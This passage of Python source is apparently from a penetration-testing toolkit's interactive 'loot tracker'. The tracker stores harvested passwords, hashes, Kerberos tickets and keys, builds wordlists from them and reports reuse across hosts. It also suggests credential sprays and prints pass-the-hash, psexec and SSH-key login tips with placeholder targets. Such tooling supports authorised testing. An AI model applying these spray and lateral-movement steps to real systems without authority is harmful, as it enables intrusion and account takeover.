    log_success(f"[+] Imported {imported} new entries")
    return entries


def _sync_loot_to_env_files(env_path: Path, entries: List[Dict[str, Any]]) -> None:
    """Write loot usernames/passwords back to the environment user/password files."""
    env_name = env_path.name

    users_file = env_path / f"{env_name}-users.txt"
    passwords_file = env_path / f"{env_name}-passwords.txt"

    existing_users: Set[str] = set()
    existing_passwords: Set[str] = set()

    if users_file.exists():
        existing_users = set(
            line.strip() for line in users_file.read_text(errors='ignore').splitlines()
            if line.strip() and not line.startswith('#')
        )
    if passwords_file.exists():
        existing_passwords = set(
            line.strip() for line in passwords_file.read_text(errors='ignore').splitlines()
            if line.strip() and not line.startswith('#')
        )

    new_users = 0
    new_passwords = 0

    for entry in entries:
        username = entry.get("username", "").strip()
        secret = entry.get("secret", "").strip()
        cred_type = entry.get("cred_type", "")

        if username and username not in existing_users:
            existing_users.add(username)
            new_users += 1

        if secret and cred_type in ("plaintext", "password") and secret not in existing_passwords:
            existing_passwords.add(secret)
            new_passwords += 1

    try:
        if new_users > 0 or not users_file.exists():
            with users_file.open('w') as f:
                f.write(f"# Users for {env_name} - synced by Empusa Loot Tracker\n")
                for u in sorted(existing_users):
                    f.write(u + "\n")
            log_verbose(f"Synced {new_users} new usernames to {users_file}", "green")

        if new_passwords > 0 or not passwords_file.exists():
            with passwords_file.open('w') as f:
                f.write(f"# Passwords for {env_name} - synced by Empusa Loot Tracker\n")
                for p in sorted(existing_passwords):
                    f.write(p + "\n")
            log_verbose(f"Synced {new_passwords} new passwords to {passwords_file}", "green")
    except Exception as e:
        log_error(f"Error syncing to env files: {e}")


def _export_loot_markdown(entries: List[Dict[str, Any]], export_path: Path) -> None:
    """Export loot to a Markdown file suitable for reports."""
    try:
        hosts: Dict[str, List[Dict[str, Any]]] = {}
        for entry in entries:
            host = entry.get("host", "unknown")
            hosts.setdefault(host, []).append(entry)

        with export_path.open('w') as f:
            f.write("# Loot Report\n\n")
            f.write(f"Generated: {datetime.now().isoformat()}\n")
            f.write(f"Total entries: {len(entries)}\n\n")

            for host in sorted(hosts.keys()):
                f.write(f"## {host}\n\n")
                f.write("| Type | Username | Secret | Source | Notes |\n")
                f.write("|------|----------|--------|--------|-------|\n")
                for e in hosts[host]:
                    f.write(
                        f"| {e.get('cred_type', '')} "
                        f"| {e.get('username', '')} "
                        f"| {e.get('secret', '')} "
                        f"| {e.get('source', '')} "
                        f"| {e.get('notes', '')} |\n"
                    )
                f.write("\n")

            user_hosts: Dict[str, List[str]] = {}
            for entry in entries:
                username = entry.get("username", "")
                host = entry.get("host", "unknown")
                if username:
                    user_hosts.setdefault(username, []).append(host)

            reused = {u: h for u, h in user_hosts.items() if len(set(h)) > 1}
            if reused:
                f.write("## Credential Reuse\n\n")
                f.write("| Username | Found On |\n")
                f.write("|----------|----------|\n")
                for user, host_list in sorted(reused.items()):
                    f.write(f"| {user} | {', '.join(sorted(set(host_list)))} |\n")
                f.write("\n")

        log_success(f"[+] Loot report exported to: {export_path}")
    except Exception as e:
        log_error(f"Error exporting loot: {e}")


# -- Loot render helpers (panel controller) --------------------------


def _display_loot_table_render(
    entries: List[Dict[str, Any]], title: str = "Loot Tracker",
) -> Any:
    """Return loot entries as a Rich Table, or a message if empty."""
    if not entries:
        return "[yellow]No loot entries found.[/yellow]"

    table = Table(title=title, show_lines=True, border_style="cyan")
    table.add_column("#", style="dim", width=4)
    table.add_column("Host", style="bold white", min_width=15)
    table.add_column("Type", style="magenta", min_width=10)
    table.add_column("Username", style="green", min_width=12)
    table.add_column("Secret", style="red", min_width=16)
    table.add_column("Source", style="yellow", min_width=10)
    table.add_column("Notes", style="dim", min_width=12)
    table.add_column("Timestamp", style="dim cyan", width=19)

    for i, entry in enumerate(entries, 1):
        table.add_row(
            str(i),
            entry.get("host", ""),
            entry.get("cred_type", ""),
            entry.get("username", ""),
            entry.get("secret", ""),
            entry.get("source", ""),
            entry.get("notes", ""),
            entry.get("timestamp", ""),
        )

    return table


def _reuse_analysis_render(entries: List[Dict[str, Any]]) -> str:
    """Return credential reuse analysis as formatted Rich markup text."""
    lines: List[str] = ["[bold yellow]Credential Reuse Analysis[/bold yellow]", ""]

    user_hosts: Dict[str, List[str]] = {}
    secret_hosts: Dict[str, List[str]] = {}

    for entry in entries:
        username = entry.get("username", "")
        secret_val = entry.get("secret", "")
        host = entry.get("host", "unknown")
        if username:
            user_hosts.setdefault(username, []).append(host)
        if secret_val:
            secret_hosts.setdefault(secret_val, []).append(host)

    reused_users = {u: list(set(h)) for u, h in user_hosts.items() if len(set(h)) > 1}
    reused_secrets = {s: list(set(h)) for s, h in secret_hosts.items() if len(set(h)) > 1}

    if reused_users:
        lines.append("[bold green]Usernames found on multiple hosts:[/bold green]")
        for user, hosts_list in sorted(reused_users.items()):
            lines.append(f"  {user}: {', '.join(sorted(hosts_list))}")
    else:
        lines.append("[dim]No username reuse detected across hosts.[/dim]")

    if reused_secrets:
        lines.append("\n[bold green]Secrets/hashes reused across hosts:[/bold green]")
        for secret_val, hosts_list in sorted(reused_secrets.items()):
            masked = secret_val[:4] + "****" if len(secret_val) > 4 else "****"
            lines.append(f"  {masked}: {', '.join(sorted(hosts_list))}")
    else:
        lines.append("\n[dim]No secret reuse detected across hosts.[/dim]")

    # Suggestions
    all_hosts: Set[str] = set()
    for entry in entries:
        h = entry.get("host", "unknown")
        if h != "unknown":
            all_hosts.add(h)

    if all_hosts and entries:
        tested_combos: Set[str] = {
            f"{e.get('username', '')}@{e.get('host', '')}" for e in entries
        }
        suggestions: List[str] = []
        for entry in entries:
            username = entry.get("username", "")
            secret_val = entry.get("secret", "")
            if not username or not secret_val:
                continue
            for h in all_hosts:
                combo = f"{username}@{h}"
                if combo not in tested_combos:
                    suggestions.append(
                        f"  Try {username}:{secret_val[:4]}**** → {h}"
                    )

        if suggestions:
            lines.append("\n[bold yellow]Suggested credential sprays:[/bold yellow]")
            for s in suggestions[:15]:
                lines.append(s)
            if len(suggestions) > 15:
                lines.append(f"  [dim]... and {len(suggestions) - 15} more[/dim]")

    return "\n".join(lines)


def loot_tracker(
    *,
    run_hooks_fn: Optional[Callable[..., Any]] = None,
    ask_env_fn: Optional[Callable[..., str]] = None,
) -> None:
    """Interactive loot tracker for managing credentials, hashes, and flags."""
    if ask_env_fn is not None:
        env_name = ask_env_fn()
    else:
        env_name = Prompt.ask("Enter environment name").strip()

    env_path = Path(env_name).absolute()

    if not env_path.exists():
        log_error(f"Environment '{env_name}' not found.")
        if not Confirm.ask("Create it anyway?"):
            return
        env_path.mkdir(parents=True, exist_ok=True)

    loot_file = env_path / "loot.json"
    entries = load_loot(loot_file)

    log_info(f"Loaded {len(entries)} loot entries from {loot_file.name}", "cyan")

    cred_types = [
        "plaintext", "ntlm", "netntlm", "kerberos", "aes-key",
        "ssh-key", "hash-other", "token", "flag", "username", "other",
    ]

    # Default content: loot table
    content: Any = _display_loot_table_render(entries, title=f"Loot - {env_name}")

    while True:
        render_screen(f"Loot Tracker [{env_name}] \u2014 {len(entries)} entries")

        # -- Content area --
        if content is not None:
            console.print(content)
            console.print("")

        log_info("[bold]Loot Tracker Menu:[/]")
        log_info("1. Add Loot Entry")
        log_info("2. View All Loot")
        log_info("3. Search Loot")
        log_info("4. Delete Entry")
        log_info("5. Import from Environment Files")
        log_info("6. Sync Loot → Environment Files")
        log_info("7. Credential Reuse Check")
        log_info("8. Export Loot Report (Markdown)")
        log_info("0. Back to Main Menu")

        choice = Prompt.ask("Select an option", choices=[str(i) for i in range(9)])

        if choice == '0':
            _save_loot(loot_file, entries)
            log_success(f"Loot saved to {loot_file}")
            break

        elif choice == '1':
            log_info("\n[bold yellow]Add Loot Entry[/bold yellow]")
            host = Prompt.ask("Host IP/hostname", default="unknown")
            cred_type = Prompt.ask(
                f"Credential type ({', '.join(cred_types)})",
                default="plaintext",
            )
            username = Prompt.ask("Username (blank if N/A)", default="")
            secret = Prompt.ask("Secret (password/hash/flag/key)", default="")
            source = Prompt.ask("Source (where you found it)", default="")
            notes = Prompt.ask("Notes (optional)", default="")

            entry: Dict[str, Any] = {
                "host": host,
                "cred_type": cred_type,
                "username": username,
                "secret": secret,
                "source": source,
                "notes": notes,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

            entries.append(entry)
            _save_loot(loot_file, entries)
            log_success("[+] Loot entry added and saved!")

            if run_hooks_fn is not None:
                run_hooks_fn("on_loot_add", {
                    "host": host,
                    "cred_type": cred_type,
                    "username": username,
                    "secret": secret,
                    "source": source,
                    "env_name": env_name,
                    "env_path": str(env_path),
                })

            if cred_type == "ntlm":
                log_info("  Tip: nxc smb <targets> -u <user> -H '<hash>'", "yellow")
            elif cred_type == "kerberos":
                log_info("  Tip: export KRB5CCNAME=<ticket> && impacket-psexec <domain>/<user>@<ip> -k -no-pass", "yellow")
            elif cred_type == "ssh-key":
                log_info("  Tip: chmod 600 <key> && ssh -i <key> <user>@<host>", "yellow")
            content = _display_loot_table_render(entries, title=f"Loot - {env_name}")

        elif choice == '2':
            content = _display_loot_table_render(entries, title=f"Loot - {env_name}")

        elif choice == '3':
            log_info("\n[bold yellow]Search Loot[/bold yellow]")
            log_info("Search by: 1=Host, 2=Username, 3=Type, 4=Keyword (any field)")
            search_type = Prompt.ask("Search by", choices=['1', '2', '3', '4'])
            query = Prompt.ask("Search term").strip().lower()

            if search_type == '1':
                results = [e for e in entries if query in e.get("host", "").lower()]
            elif search_type == '2':
                results = [e for e in entries if query in e.get("username", "").lower()]
            elif search_type == '3':
                results = [e for e in entries if query in e.get("cred_type", "").lower()]
            else:
                results = [
                    e for e in entries
                    if any(query in str(v).lower() for v in e.values())
                ]

            _display_loot_table(results, title=f"Search results: '{query}'")
            content = _display_loot_table_render(results, title=f"Search results: '{query}'")

        elif choice == '4':
            if not entries:
                content = "[yellow]No entries to delete.[/yellow]"
                continue

            _display_loot_table(entries, title=f"Loot - {env_name}")
            try:
                idx = int(Prompt.ask("Entry # to delete")) - 1
                if 0 <= idx < len(entries):
                    removed = entries.pop(idx)
                    _save_loot(loot_file, entries)
                    log_success(
                        f"[-] Removed: {removed.get('username', '')}@{removed.get('host', '')} "
                        f"({removed.get('cred_type', '')})"
                    )
                else:
                    log_error("Invalid entry number.")
            except ValueError:
                log_error("Please enter a valid number.")
            content = _display_loot_table_render(entries, title=f"Loot - {env_name}")

        elif choice == '5':
            entries = _import_env_creds(env_path, entries)
            _save_loot(loot_file, entries)
            content = _display_loot_table_render(entries, title=f"Loot - {env_name}")

        elif choice == '6':
            _sync_loot_to_env_files(env_path, entries)
            content = "[green]✔[/green] Loot synced to environment files"

        elif choice == '7':
            content = _reuse_analysis_render(entries)

        elif choice == '8':
            export_path = env_path / "loot_report.md"
            _export_loot_markdown(entries, export_path)
            content = f"[green]✔[/green] Loot report exported to: {export_path}"
